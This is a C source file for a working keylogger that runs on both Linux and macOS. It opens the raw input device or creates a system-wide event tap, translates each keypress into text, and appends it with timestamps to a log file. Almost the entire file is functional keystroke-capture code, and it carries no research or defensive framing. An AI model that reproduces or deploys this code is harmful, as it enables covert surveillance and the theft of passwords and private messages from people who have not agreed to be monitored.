#include "keylogger.h"

#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#ifdef __linux__
#include <fcntl.h>
#include <linux/input.h>
#include <poll.h>
#elif defined(__APPLE__)
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#endif

static void keylogger_write_token(keylogger_state_t *state, const char *token);
static void keylogger_write_marker(keylogger_state_t *state, const char *action);
static void format_key_token(unsigned int keycode, char *token, size_t token_len);

#ifdef __linux__
static void *linux_keylogger_thread(void *arg);
#elif defined(__APPLE__)
static CGEventRef macos_keylogger_callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon);
static void *macos_keylogger_thread(void *arg);
#endif

void keylogger_state_init(keylogger_state_t *state) {
    memset(state, 0, sizeof(*state));
    (void)pthread_mutex_init(&state->lock, NULL);
#ifdef __linux__
    state->input_fd = -1;
#endif
}

void keylogger_state_destroy(keylogger_state_t *state) {
    char error[128];

    if (state->active) {
        (void)keylogger_stop(state, error, sizeof(error));
    }

    (void)pthread_mutex_destroy(&state->lock);
}

const char *keylogger_platform_default_device(void) {
#ifdef __linux__
    return "/dev/input/event0";
#elif defined(__APPLE__)
    return "event-tap";
#else
    return "unsupported";
#endif
}

int keylogger_start(
    keylogger_state_t *state,
    const char *device_path,
    const char *log_path,
    char *error,
    size_t error_len
) {
    const char *resolved_path;

    pthread_mutex_lock(&state->lock);
    if (state->active) {
        pthread_mutex_unlock(&state->lock);
        snprintf(error, error_len, "keylogger already running");
        return -1;
    }
    pthread_mutex_unlock(&state->lock);

    if (device_path == NULL || device_path[0] == '\0' || strcmp(device_path, KEYLOGGER_AUTO_DEVICE) == 0) {
        resolved_path = keylogger_platform_default_device();
    } else {
        resolved_path = device_path;
    }

    state->log_fp = fopen(log_path != NULL ? log_path : KEYLOGGER_LOG_FILE, "a");
    if (state->log_fp == NULL) {
        snprintf(error, error_len, "cannot open keylog file: %s", strerror(errno));
        return -1;
    }

#ifdef __linux__
    state->input_fd = open(resolved_path, O_RDONLY | O_NONBLOCK);
    if (state->input_fd < 0) {
        snprintf(error, error_len, "cannot open %s: %s", resolved_path, strerror(errno));
        fclose(state->log_fp);
        state->log_fp = NULL;
        return -1;
    }
#elif defined(__APPLE__)
    state->event_tap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        0,
        CGEventMaskBit(kCGEventKeyDown),
        macos_keylogger_callback,
        state
    );

    if (state->event_tap == NULL) {
        snprintf(error, error_len, "cannot create event tap; Accessibility permission is likely required");
        fclose(state->log_fp);
        state->log_fp = NULL;
        return -1;
    }

    state->run_loop_source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, (CFMachPortRef)state->event_tap, 0);
    if (state->run_loop_source == NULL) {
        snprintf(error, error_len, "cannot create event tap run loop source");
        CFRelease((CFTypeRef)state->event_tap);
        state->event_tap = NULL;
        fclose(state->log_fp);
        state->log_fp = NULL;
        return -1;
    }
#else
    snprintf(error, error_len, "keylogger is not supported on this platform");
    fclose(state->log_fp);
    state->log_fp = NULL;
    return -1;
#endif

    pthread_mutex_lock(&state->lock);
    state->running = 1;
    state->active = 1;
    snprintf(state->device_path, sizeof(state->device_path), "%s", resolved_path);
    pthread_mutex_unlock(&state->lock);

    keylogger_write_marker(state, "START");

#ifdef __linux__
    if (pthread_create(&state->thread, NULL, linux_keylogger_thread, state) != 0) {
#elif defined(__APPLE__)
    if (pthread_create(&state->thread, NULL, macos_keylogger_thread, state) != 0) {
#endif
        pthread_mutex_lock(&state->lock);
        state->running = 0;
        state->active = 0;
        state->device_path[0] = '\0';
        pthread_mutex_unlock(&state->lock);
#ifdef __linux__
        close(state->input_fd);
        state->input_fd = -1;
#elif defined(__APPLE__)
        if (state->run_loop_source != NULL) {
            CFRelease((CFTypeRef)state->run_loop_source);
            state->run_loop_source = NULL;
        }
        if (state->event_tap != NULL) {
            CFRelease((CFTypeRef)state->event_tap);
            state->event_tap = NULL;
        }
#endif
        fclose(state->log_fp);
        state->log_fp = NULL;
        snprintf(error, error_len, "cannot create keylogger thread");
        return -1;
    }

    state->thread_started = 1;
    return 0;
}

int keylogger_stop(keylogger_state_t *state, char *error, size_t error_len) {
    int should_join = 0;

    pthread_mutex_lock(&state->lock);
    if (!state->active) {
        pthread_mutex_unlock(&state->lock);
        return 0;
    }

    state->running = 0;
    should_join = state->thread_started;
    pthread_mutex_unlock(&state->lock);

    if (should_join) {
        (void)pthread_join(state->thread, NULL);
    }

    keylogger_write_marker(state, "STOP");

    pthread_mutex_lock(&state->lock);
    state->thread_started = 0;
    state->active = 0;
    state->device_path[0] = '\0';
#ifdef __linux__
    if (state->input_fd >= 0) {
        close(state->input_fd);
        state->input_fd = -1;
    }
#elif defined(__APPLE__)
    if (state->run_loop_source != NULL) {
        CFRelease((CFTypeRef)state->run_loop_source);
        state->run_loop_source = NULL;
    }
    if (state->event_tap != NULL) {
        CFRelease((CFTypeRef)state->event_tap);
        state->event_tap = NULL;
    }
#endif
    if (state->log_fp != NULL) {
        fclose(state->log_fp);
        state->log_fp = NULL;
    }
    pthread_mutex_unlock(&state->lock);

    (void)error;
    (void)error_len;
    return 0;
}

static void keylogger_write_token(keylogger_state_t *state, const char *token) {
    pthread_mutex_lock(&state->lock);
    if (state->log_fp != NULL) {
        fputs(token, state->log_fp);
        fflush(state->log_fp);
    }
    pthread_mutex_unlock(&state->lock);
}

static void keylogger_write_marker(keylogger_state_t *state, const char *action) {
    time_t now;
    char line[128];

    now = time(NULL);
    snprintf(line, sizeof(line), "\n[%s %ld]\n", action, (long)now);
    keylogger_write_token(state, line);
}

static void format_key_token(unsigned int keycode, char *token, size_t token_len) {
    switch (keycode) {
#ifdef __linux__
        case KEY_A:
#elif defined(__APPLE__)
        case kVK_ANSI_A:
#endif
            snprintf(token, token_len, "a");
            break;
#ifdef __linux__
        case KEY_B:
#elif defined(__APPLE__)
        case kVK_ANSI_B:
#endif
            snprintf(token, token_len, "b");
            break;
#ifdef __linux__
        case KEY_C:
#elif defined(__APPLE__)
        case kVK_ANSI_C:
#endif
            snprintf(token, token_len, "c");
            break;
#ifdef __linux__
        case KEY_D:
#elif defined(__APPLE__)
        case kVK_ANSI_D:
#endif
            snprintf(token, token_len, "d");
            break;
#ifdef __linux__
        case KEY_E:
#elif defined(__APPLE__)
        case kVK_ANSI_E:
#endif
            snprintf(token, token_len, "e");
            break;
#ifdef __linux__
        case KEY_F:
#elif defined(__APPLE__)
        case kVK_ANSI_F:
#endif
            snprintf(token, token_len, "f");
            break;
#ifdef __linux__
        case KEY_G:
#elif defined(__APPLE__)
        case kVK_ANSI_G:
#endif
            snprintf(token, token_len, "g");
            break;
#ifdef __linux__
        case KEY_H:
#elif defined(__APPLE__)
        case kVK_ANSI_H:
#endif
            snprintf(token, token_len, "h");
            break;
#ifdef __linux__
        case KEY_I:
#elif defined(__APPLE__)
        case kVK_ANSI_I:
#endif
            snprintf(token, token_len, "i");
            break;
#ifdef __linux__
        case KEY_J:
#elif defined(__APPLE__)
        case kVK_ANSI_J:
#endif
            snprintf(token, token_len, "j");
            break;
#ifdef __linux__
        case KEY_K:
#elif defined(__APPLE__)
        case kVK_ANSI_K:
#endif
            snprintf(token, token_len, "k");
            break;
#ifdef __linux__
        case KEY_L:
#elif defined(__APPLE__)
        case kVK_ANSI_L:
#endif
            snprintf(token, token_len, "l");
            break;
#ifdef __linux__
        case KEY_M:
#elif defined(__APPLE__)
        case kVK_ANSI_M:
#endif
            snprintf(token, token_len, "m");
            break;
#ifdef __linux__
        case KEY_N:
#elif defined(__APPLE__)
        case kVK_ANSI_N:
#endif
            snprintf(token, token_len, "n");
            break;
#ifdef __linux__
        case KEY_O:
#elif defined(__APPLE__)
        case kVK_ANSI_O:
#endif
            snprintf(token, token_len, "o");
            break;
#ifdef __linux__
        case KEY_P:
#elif defined(__APPLE__)
        case kVK_ANSI_P:
#endif
            snprintf(token, token_len, "p");
            break;
#ifdef __linux__
        case KEY_Q:
#elif defined(__APPLE__)
        case kVK_ANSI_Q:
#endif
            snprintf(token, token_len, "q");
            break;
#ifdef __linux__
        case KEY_R:
#elif defined(__APPLE__)
        case kVK_ANSI_R:
#endif
            snprintf(token, token_len, "r");
            break;
#ifdef __linux__
        case KEY_S:
#elif defined(__APPLE__)
        case kVK_ANSI_S:
#endif
            snprintf(token, token_len, "s");
            break;
#ifdef __linux__
        case KEY_T:
#elif defined(__APPLE__)
        case kVK_ANSI_T:
#endif
            snprintf(token, token_len, "t");
            break;
#ifdef __linux__
        case KEY_U:
#elif defined(__APPLE__)
        case kVK_ANSI_U:
#endif
            snprintf(token, token_len, "u");
            break;
#ifdef __linux__
        case KEY_V:
#elif defined(__APPLE__)
        case kVK_ANSI_V:
#endif
            snprintf(token, token_len, "v");
            break;
#ifdef __linux__
        case KEY_W:
#elif defined(__APPLE__)
        case kVK_ANSI_W:
#endif
            snprintf(token, token_len, "w");
            break;
#ifdef __linux__
        case KEY_X:
#elif defined(__APPLE__)
        case kVK_ANSI_X:
#endif
            snprintf(token, token_len, "x");
            break;
#ifdef __linux__
        case KEY_Y:
#elif defined(__APPLE__)
        case kVK_ANSI_Y:
#endif
            snprintf(token, token_len, "y");
            break;
#ifdef __linux__
        case KEY_Z:
#elif defined(__APPLE__)
        case kVK_ANSI_Z:
#endif
            snprintf(token, token_len, "z");
            break;
#ifdef __linux__
        case KEY_0:
#elif defined(__APPLE__)
        case kVK_ANSI_0:
#endif
            snprintf(token, token_len, "0");
            break;
#ifdef __linux__
        case KEY_1:
#elif defined(__APPLE__)
        case kVK_ANSI_1:
#endif
            snprintf(token, token_len, "1");
            break;
#ifdef __linux__
        case KEY_2:
#elif defined(__APPLE__)
        case kVK_ANSI_2:
#endif
            snprintf(token, token_len, "2");
            break;
#ifdef __linux__
        case KEY_3:
#elif defined(__APPLE__)
        case kVK_ANSI_3:
#endif
            snprintf(token, token_len, "3");
            break;
#ifdef __linux__
        case KEY_4:
#elif defined(__APPLE__)
        case kVK_ANSI_4:
#endif
            snprintf(token, token_len, "4");
            break;
#ifdef __linux__
        case KEY_5:
#elif defined(__APPLE__)
        case kVK_ANSI_5:
#endif
            snprintf(token, token_len, "5");
            break;
#ifdef __linux__
        case KEY_6:
#elif defined(__APPLE__)
        case kVK_ANSI_6:
#endif
            snprintf(token, token_len, "6");
            break;
#ifdef __linux__
        case KEY_7:
#elif defined(__APPLE__)
        case kVK_ANSI_7:
#endif
            snprintf(token, token_len, "7");
            break;
#ifdef __linux__
        case KEY_8:
#elif defined(__APPLE__)
        case kVK_ANSI_8:
#endif
            snprintf(token, token_len, "8");
            break;
#ifdef __linux__
        case KEY_9:
#elif defined(__APPLE__)
        case kVK_ANSI_9:
#endif
            snprintf(token, token_len, "9");
            break;
#ifdef __linux__
        case KEY_SPACE:
#elif defined(__APPLE__)
        case kVK_Space:
#endif
            snprintf(token, token_len, " ");
            break;
#ifdef __linux__
        case KEY_ENTER:
#elif defined(__APPLE__)
        case kVK_Return:
#endif
            snprintf(token, token_len, "\n");
            break;
#ifdef __linux__
        case KEY_TAB:
#elif defined(__APPLE__)
        case kVK_Tab:
#endif
            snprintf(token, token_len, "\t");
            break;
#ifdef __linux__
        case KEY_BACKSPACE:
#elif defined(__APPLE__)
        case kVK_Delete:
#endif
            snprintf(token, token_len, "[BACKSPACE]");
            break;
#ifdef __linux__
        case KEY_ESC:
#elif defined(__APPLE__)
        case kVK_Escape:
#endif
            snprintf(token, token_len, "[ESC]");
            break;
        default:
            snprintf(token, token_len, "[KEY_%u]", keycode);
            break;
    }
}

#ifdef __linux__
static void *linux_keylogger_thread(void *arg) {
    keylogger_state_t *state = (keylogger_state_t *)arg;

    while (1) {
        struct pollfd poll_fd;
        struct input_event event;
        int ready;
        int running;

        pthread_mutex_lock(&state->lock);
        running = state->running;
        poll_fd.fd = state->input_fd;
        pthread_mutex_unlock(&state->lock);

        if (!running) {
            break;
        }

        poll_fd.events = POLLIN;
        poll_fd.revents = 0;

        ready = poll(&poll_fd, 1, 250);
        if (ready < 0) {
            if (errno == EINTR) {
                continue;
            }
            break;
        }

        if (ready == 0 || !(poll_fd.revents & POLLIN)) {
            continue;
        }

        while (read(poll_fd.fd, &event, sizeof(event)) == (ssize_t)sizeof(event)) {
            if (event.type == EV_KEY && (event.value == 1 || event.value == 2)) {
                char token[32];

                format_key_token(event.code, token, sizeof(token));
                keylogger_write_token(state, token);
            }
        }

        if (errno != EAGAIN && errno != EWOULDBLOCK && errno != EINTR) {
            break;
        }
    }

    return NULL;
}
#elif defined(__APPLE__)
static CGEventRef macos_keylogger_callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    keylogger_state_t *state = (keylogger_state_t *)refcon;
    char token[32];
    CGKeyCode keycode;

    (void)proxy;

    if (type != kCGEventKeyDown) {
        return event;
    }

    keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    format_key_token((unsigned int)keycode, token, sizeof(token));
    keylogger_write_token(state, token);
    return event;
}

static void *macos_keylogger_thread(void *arg) {
    keylogger_state_t *state = (keylogger_state_t *)arg;
    CFMachPortRef tap = (CFMachPortRef)state->event_tap;
    CFRunLoopSourceRef source = (CFRunLoopSourceRef)state->run_loop_source;
    CFRunLoopRef run_loop = CFRunLoopGetCurrent();

    CFRunLoopAddSource(run_loop, source, kCFRunLoopCommonModes);
    CGEventTapEnable(tap, true);

    while (1) {
        int running;

        pthread_mutex_lock(&state->lock);
        running = state->running;
        pthread_mutex_unlock(&state->lock);

        if (!running) {
            break;
        }

        (void)CFRunLoopRunInMode(kCFRunLoopDefaultMode, 0.25, false);
    }

    CFRunLoopRemoveSource(run_loop, source, kCFRunLoopCommonModes);
    return NULL;
}
#endif
